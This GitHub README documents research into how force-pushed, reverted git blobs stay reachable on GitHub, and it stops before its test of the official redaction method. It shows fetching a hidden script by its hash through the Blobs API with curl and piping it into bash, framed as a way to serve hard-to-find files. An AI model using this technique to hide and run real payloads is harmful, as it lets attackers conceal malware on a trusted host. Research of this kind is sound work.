# boblobblob - Hiding git blobs in plain sight
This project demonstrates some experimentation with how Github handles git blobs, inspired by research done by [Kevin Hodges](https://github.com/khodges42/ghostfacekilla).

It will serve both as a repository that will document my experiments, and results of this research.

## Creating our intially hidden file
First, we will create a file we want to hide:

```bash
# cat hiddenfile.sh
echo "secret malicious code has been executed"
# git add hiddenfile.sh
```

Next, we'll grab the sha sum for this file, and note it:
```bash
# git hash-object hiddenfile.sh
44531211b7c63aab97c174d98d79e99b1086f145
```

Finally, we'll commit this file, and push it:

```bash
# git commit "added hidden file"
 git commit -m "added hidden file"
[master ce50e8a] added hidden file
 1 file changed, 1 insertion(+)
 create mode 100644 hiddenfile.sh
# git push
Counting objects: 4, done.
Delta compression using up to 12 threads.
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 326 bytes | 0 bytes/s, done.
Total 3 (delta 0), reused 0 (delta 0)
To git@github.com:Und3rf10w/boblobblob.git
   a27e6e3..ce50e8a  master -> master
```

At this point a tree for this push has been created and [can be found here](https://github.com/Und3rf10w/boblobblob/tree/ce50e8a618900b0c897c3d77d3b5872bb4361db8).

There are many instances where it may be benefical to revert a commit that has been accidently pushed to GitHub, such as accidently commiting secrets, justifying the need the ability to revert them. Let's revert the commit where we added `hiddenfile.sh` through the git command line, by going back to the commit to remove it, and force pushing it:

```bash
# git reset --hard a27e6e38d63dacf9bb828a01abbbb41dee0cdb76
HEAD is now at a27e6e3 Filled README.md
#  git push -f origin master
Total 0 (delta 0), reused 0 (delta 0)
To git@github.com:Und3rf10w/boblobblob.git
 + 7e66cf5...a27e6e3 master -> master (forced update)
```

## Accessing `hiddenfile.sh`

Now, if we look at the GitHub interface, aside from this document, there's no indication that our tree ever existed, however, [you can still browse to it](https://github.com/Und3rf10w/boblobblob/tree/ce50e8a618900b0c897c3d77d3b5872bb4361db8), as well as [access the file we attempted to redact](https://github.com/Und3rf10w/boblobblob/blob/ce50e8a618900b0c897c3d77d3b5872bb4361db8/hiddenfile.sh).

To anyone simply browsing this repository, assuming no links existing, there would never be any indication that `hiddenfile.sh` ever actually existed. But we can obviously still access it.

If we still have this blob located in our `.git` directory (which would only ever happen if you had a copy of the repository between the time that `hiddenfile.sh` was commited and redacted), then [as show in Kevin's project](https://github.com/khodges42/ghostfacekilla/blob/44a1f29de1f14d06d5876d10723d993ec6bd1fbb/src/sneaky_gfk.sh#L6), we can access this locally with `git cat-file` simply by knowing `hiddenfile.sh`'s sha sum:

```bash
# git cat-file -p 44531211b7c63aab97c174d98d79e99b1086f145
echo "secret malicious code has been executed"
# git cat-file -p 44531211b7c63aab97c174d98d79e99b1086f145 | bash
secret malicious code has been executed
```

However, what if we wanted to use to serve a file through `github.com` that would be difficult to discover through curosory investigation?

## Using the Git Blobs api
GitHub provides a [Git Blobs](https://developer.github.com/v3/git/blobs/) api that allows us to interact with git blobs with no authentication. The HTTP request for this uses the following format for `api.github.com`:

`GET /repos/:owner/:repo/git/blobs/:file_sha`

Let's try to grab the file through the api:

``` bash
# curl --silent -H "Content-Type: application/json" -H "Accept: application/vnd.github.v3.raw" https://api.github.com/repos/Und3rf10w/boblobblob/git/blobs/44531211b7c63aab97c174d98d79e99b1086f145
echo "secret malicious code has been executed"
# !! | bash
secret malicious code has been executed
```

This demonstrates one method to store and serve a file you wish to remain hidden through GitHub's handling of git blobs.

# Testing the offical way to redact commits
The method we used above is actually an [extremely popular answer on Stack Overflow](https://stackoverflow.com/a/1338744), but not the [offically documented method](https://help.github.com/articles/removing-sensitive-data-from-a-repository/) to remove sensitive data from a repository.

Let's create a new file, commit it and test to see if we can still do this after following the offical documentation.


